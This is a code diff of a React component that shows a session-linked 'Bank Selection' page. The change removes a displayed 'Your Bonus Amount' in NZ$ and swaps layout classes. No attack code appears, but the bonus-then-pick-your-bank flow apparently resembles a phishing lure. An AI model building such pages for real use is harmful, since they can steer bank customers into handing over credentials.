@@ -28,8 +28,6 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   const [msg, setMsg] = useState<string | null>(null);
   const [recovering, setRecovering] = useState(false);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
-  const [amount, setAmount] = useState<number>(0);
-  const [currency, setCurrency] = useState("NZ$");
   const navigationLockRef = useRef(false);
   const refreshAbortRef = useRef<AbortController | null>(null);
   const selectionVersionRef = useRef(0);
@@ -168,11 +166,9 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     let cancelled = false;
     void (async () => {
       if (supabase === null || !sessionId) return;
-      const { data } = await supabase.from("sessions").select("amount, form_data").eq("id", sessionId).maybeSingle();
+      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
-      setAmount(data.amount ?? 0);
-      if (fd.currency) setCurrency(fd.currency);
       setSessionFormData(fd);
       setBankSlug(fd.bankSlug ?? "");
     })();
@@ -231,7 +227,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
 
   if (!supabase) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
@@ -242,7 +238,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   if (!sessionId) {
     if (recovering) {
       return (
-        <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="pak-page-shell">
           <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
             <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
             <p className="text-sm text-gray-300 mb-8">Restoring session...</p>
@@ -254,7 +250,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       );
     }
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
           <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
           <p className="text-sm text-gray-300 mb-6">Invalid link.</p>
@@ -277,7 +273,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   }
 
   return (
-    <div className="flex min-h-[100dvh] items-start justify-center p-2 pt-[14vh] sm:p-4 sm:pt-[24vh]">
+    <div className="pak-page-shell">
       <div className="relative z-10 w-full max-w-[980px] space-y-4">
         <div className="pak-form-card p-4 sm:p-6">
           <div className="pak-form-inner">
@@ -286,17 +282,6 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                 <div className="max-w-[36rem]">
                   <h2 className="pak-form-title">{settings.banken_title}</h2>
                   <p className="pak-form-subtitle mt-3">{settings.banken_subtitle}</p>
-                </div>
-
-                <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
-                  <div className="pak-form-amount-label">
-                    <div>Your</div>
-                    <div>Bonus Amount</div>
-                  </div>
-                  <div className="pak-form-amount-divider" />
-                  <div className="pak-form-amount-value">
-                    {currency}{amount.toLocaleString("en-NZ")}
-                  </div>
                 </div>
               </div>
 
